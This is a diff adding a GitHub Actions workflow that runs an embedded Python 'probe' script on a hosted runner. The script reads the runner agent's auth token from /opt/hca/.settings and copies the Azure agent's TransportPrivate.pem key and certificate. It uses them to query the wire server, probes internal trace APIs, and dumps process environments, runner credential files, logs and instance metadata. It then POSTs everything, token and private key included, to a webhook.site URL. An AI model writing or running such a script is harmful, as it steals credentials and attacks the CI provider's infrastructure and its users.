@@ -1,0 +1,275 @@
+name: Probe v47 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V47_SOURCE: v47_account_a
+    steps:
+      - name: v47 wire server cert+key + trace body + HCA analysis
+        run: |
+          cat > /tmp/v47_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V47_SOURCE", "v47_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth(method, url, token, body=None):
+              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
+          
+          def sh(cmd, timeout=15):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          trace_url = s.get("traceApiUrl", "").rstrip("/")
+          watch_url = s.get("watchdogTraceApiUrl", "").rstrip("/")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          results = {}
+          
+          # -- 1. Wire server with CORRECT separate cert + key --------------------
+          print(f"\n[{SOURCE}] Wire server -- correct cert/key pair...")
+          
+          # Copy TransportCert and TransportPrivate separately
+          wire_results = {}
+          tc_pem = "/tmp/tc_v47.pem"
+          tk_pem = "/tmp/tk_v47.pem"
+          cp_tc = sh(f"sudo cp /var/lib/waagent/TransportCert.pem {tc_pem} && sudo chmod 644 {tc_pem}")
+          cp_tk = sh(f"sudo cp /var/lib/waagent/TransportPrivate.pem {tk_pem} && sudo chmod 644 {tk_pem}")
+          print(f"[WIRE] cp cert: '{cp_tc[:50]}' key: '{cp_tk[:50]}'")
+          wire_results["cp_cert"] = cp_tc
+          wire_results["cp_key"] = cp_tk
+          
+          # Read and capture the actual cert/key content (for report)
+          tc_content = sh(f"sudo cat /var/lib/waagent/TransportCert.pem 2>&1")
+          tk_content = sh(f"sudo cat /var/lib/waagent/TransportPrivate.pem 2>&1")
+          wire_results["transport_cert"] = tc_content[:3000]
+          wire_results["transport_key"] = tk_content[:3000]
+          print(f"[WIRE] TransportCert.pem ({len(tc_content)} chars)")
+          print(f"[WIRE] TransportPrivate.pem ({len(tk_content)} chars)")
+          if "BEGIN CERTIFICATE" in tc_content:
+              print(f"[WIRE] *** CERT OBTAINED:\n{tc_content[:300]}")
+          if "BEGIN PRIVATE KEY" in tk_content or "BEGIN RSA" in tk_content:
+              print(f"[WIRE] *** KEY OBTAINED:\n{tk_content[:300]}")
+          
+          # Try wire server with correct cert + key (separate files)
+          wire_endpoints = [
+              "/machine?comp=versions",
+              "/machine?comp=goalstate",
+              "/machine?comp=config",
+              "/machine?comp=extensionHandlerConfig",
+              "/machine?comp=telemetry",
+          ]
+          for wep in wire_endpoints:
+              # Try both http and https
+              for scheme, port in [("http", ""), ("https", ":443")]:
+                  host = f"168.63.129.16{port}"
+                  cmd = (f'curl -v -s -w "\\n---HTTP_CODE:%{{http_code}}---" -X GET '
+                         f'"{scheme}://{host}{wep}" '
+                         f'--cert {tc_pem} --key {tk_pem} '
+                         f'-H "x-ms-agent-name: WALinuxAgent" '
+                         f'-H "x-ms-version: 2012-11-30" '
+                         f'--max-time 10 2>&1')
+                  out = sh(cmd, timeout=14)
+                  key = f"{scheme}:{wep}"
+                  wire_results[key] = out[:3000]
+                  if "HTTP_CODE:" in out:
+                      http_code = re.search(r'HTTP_CODE:(\d+)', out)
+                      code = http_code.group(1) if http_code else "?"
+                      print(f"[WIRE] {scheme} {wep} -> HTTP {code} | {out[:200]}")
+                  else:
+                      print(f"[WIRE] {scheme} {wep} -> NO HTTP CODE | {out[:100]}")
+          
+          results["wire"] = wire_results
+          
+          # -- 2. Trace API -- get FULL 400 error body ----------------------------
+          print(f"\n[{SOURCE}] Trace API full error body analysis...")
+          trace_full = {}
+          
+          # First get the full 400 body for each of these variants
+          for label, body in [
+              ("empty",       "{}"),
+              ("orchestration_only", json.dumps({"orchestration_id": orch_id})),
+              ("wid_only",    json.dumps({"worker_id": wid})),
+              ("span",        json.dumps({"spans": []})),
+              ("event",       json.dumps({"event_type": "job_start", "orchestration_id": orch_id})),
+              ("trace_entry", json.dumps({"entries": [{"message": "test", "level": 1}]})),
+              ("otel_spans",  json.dumps({"resource_spans": [{"resource": {}, "instrumentation_library_spans": []}]})),
+              ("grpc_style",  json.dumps({"name": "probe", "request_id": orch_id, "timestamp_ms": int(time.time()*1000)})),
+              ("job_trace",   json.dumps({"job_id": orch_id, "step": "build", "message": "probe", "level": "info"})),
+              ("heartbeat",   json.dumps({"type": "heartbeat", "worker_id": wid, "job_id": orch_id})),
+          ]:
+              r = auth("POST", trace_url, token, body)
+              trace_full[label] = {"status": r["status"], "request_body": body, "response": r["body"][:3000]}
+              print(f"[TRACE] {label:20} -> {r['status']} | response_START: {r['body'][:400]}")
+          
+          results["trace_full"] = trace_full
+          
+          # -- 3. HCA binary analysis: command line, open files, connections ------
+          print(f"\n[{SOURCE}] HCA binary process analysis...")
+          hca_pid = sh("pgrep -f hosted-compute-agent 2>&1").strip()
+          hca_results = {"pid": hca_pid}
+          
+          if hca_pid and hca_pid.isdigit():
+              # cmdline
+              cmdline = sh(f"cat /proc/{hca_pid}/cmdline 2>&1 | tr '\\0' ' '")
+              hca_results["cmdline"] = cmdline
+              print(f"[HCA] cmdline: {cmdline}")
+          
+              # environment of the process
+              hca_env = sh(f"cat /proc/{hca_pid}/environ 2>&1 | tr '\\0' '\\n'")
+              hca_results["environ"] = hca_env[:4000]
+              print(f"[HCA] environ:\n{hca_env[:2000]}")
+          
+              # open files / sockets
+              open_files = sh(f"ls -la /proc/{hca_pid}/fd/ 2>&1")
+              hca_results["open_files"] = open_files[:3000]
+              print(f"[HCA] open files:\n{open_files[:1000]}")
+          
+              # net connections (TCP+UDP)
+              net_tcp  = sh(f"cat /proc/{hca_pid}/net/tcp 2>&1")
+              net_tcp6 = sh(f"cat /proc/{hca_pid}/net/tcp6 2>&1")
+              hca_results["net_tcp"]  = net_tcp[:3000]
+              hca_results["net_tcp6"] = net_tcp6[:3000]
+              print(f"[HCA] /proc/{hca_pid}/net/tcp:\n{net_tcp[:1000]}")
+          
+              # maps (shared libraries and memory)
+              maps = sh(f"cat /proc/{hca_pid}/maps 2>&1")
+              hca_results["maps_excerpt"] = maps[:2000]
+              print(f"[HCA] maps excerpt:\n{maps[:500]}")
+          else:
+              print(f"[HCA] PID not found: '{hca_pid}'")
+              hca_results["ps_all"] = sh("ps aux 2>&1")
+              print(f"[HCA] ps aux:\n{hca_results['ps_all'][:2000]}")
+          
+          results["hca"] = hca_results
+          
+          # -- 4. Unix socket scan (local IPC) -----------------------------------
+          print(f"\n[{SOURCE}] Unix socket scan...")
+          unix_sockets = sh("ss -xlnp 2>&1")
+          print(f"[UNIX] ss -xlnp:\n{unix_sockets}")
+          results["unix_sockets"] = unix_sockets
+          
+          # Try known unix socket paths
+          for sock_path in [
+              "/var/run/docker.sock",
+              "/run/docker.sock",
+              "/tmp/hca.sock",
+              "/tmp/hosted-compute.sock",
+              "/opt/hca/hca.sock",
+              "/run/hca.sock",
+          ]:
+              exists = os.path.exists(sock_path)
+              if exists:
+                  print(f"[UNIX] *** FOUND: {sock_path}")
+          results["unix_socket_probes"] = {p: os.path.exists(p) for p in [
+              "/var/run/docker.sock", "/run/docker.sock", "/tmp/hca.sock",
+              "/tmp/hosted-compute.sock", "/opt/hca/hca.sock", "/run/hca.sock"
+          ]}
+          
+          # -- 5. Full HCA directory listing + runner config ----------------------
+          print(f"\n[{SOURCE}] HCA and runner directory analysis...")
+          hca_dir = sh("ls -la /opt/hca/ 2>&1")
+          runner_dir = sh("ls -la /home/runner/ 2>&1")
+          runner_work = sh("ls -la /home/runner/work/ 2>&1 || ls -la /runner/ 2>&1")
+          hca_logs = sh("ls -la /opt/hca/logs/ 2>&1")
+          print(f"[DIR] /opt/hca:\n{hca_dir}")
+          print(f"[DIR] /home/runner:\n{runner_dir}")
+          print(f"[DIR] logs:\n{hca_logs}")
+          results["dirs"] = {
+              "hca": hca_dir,
+              "runner": runner_dir,
+              "runner_work": runner_work,
+              "hca_logs": hca_logs,
+          }
+          
+          # Read runner credentials files if they exist
+          for rfile in ["/home/runner/.runner", "/home/runner/.credentials", "/home/runner/.credentials_rsaparams"]:
+              content = sh(f"cat {rfile} 2>&1")
+              results[f"runner_file_{rfile.split('/')[-1]}"] = content[:1000]
+              if "BEGIN" in content or "token" in content.lower():
+                  print(f"[RUNNER] *** {rfile}: {content[:300]}")
+              else:
+                  print(f"[RUNNER] {rfile}: {content[:60]}")
+          
+          # -- 6. Full global TCP connections (what HCA binary calls remotely) ---
+          print(f"\n[{SOURCE}] All TCP connections...")
+          ss_all = sh("ss -tnp 2>&1")
+          print(f"[NET] All TCP connections:\n{ss_all}")
+          results["ss_all_tcp"] = ss_all
+          
+          # -- 7. Full HCA log (no truncation) ------------------------------------
+          print(f"\n[{SOURCE}] Full HCA log...")
+          hca_log = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>&1")
+          print(f"[LOG] HCA log ({len(hca_log)} chars):\n{hca_log[:8000]}")
+          results["hca_log"] = hca_log[:20000]
+          
+          # -- 8. IMDS full instance metadata ------------------------------------
+          print(f"\n[{SOURCE}] Full IMDS instance metadata...")
+          r = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                    extra={"Metadata": "true"})
+          imds_full = r["body"]
+          print(f"[IMDS] Full instance: {imds_full[:3000]}")
+          results["imds_full"] = imds_full[:8000]
+          
+          # IMDS attested document
+          r2 = probe("GET", "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          results["imds_attested"] = r2["body"][:2000]
+          
+          # -- 9. POST to webhook -------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "sched_url": sched_url, "trace_url": trace_url, "watch_url": watch_url,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=25)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v47_probe.py
+      - name: Keep alive
+        run: sleep 60
